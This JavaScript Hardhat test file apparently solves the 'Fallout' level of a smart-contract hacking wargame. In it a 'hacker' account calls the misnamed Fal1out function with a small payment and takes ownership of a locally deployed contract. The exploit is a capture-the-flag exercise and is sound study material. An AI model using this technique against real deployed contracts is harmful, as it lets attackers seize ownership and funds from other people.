const { loadFixture, } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
  
describe("Level02 - Fallout", function () {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const FalloutContract = await ethers.deployContract("Fallout");
        const FalloutAddress = await FalloutContract.getAddress();

        return {owner, hacker, FalloutContract, FalloutAddress};
    };

    describe("Level02 hacking", () => {
        it("should allow the hacker to become the owner by invoking the Fal1out function", async() => {
            const {owner, hacker, FalloutContract, FalloutAddress} = await loadFixture(setUp);
            await FalloutContract.connect(hacker).Fal1out({value: ethers.parseEther("0.0001")});

            expect(await FalloutContract.owner()).to.equal(hacker.address);
        }); 
    })

});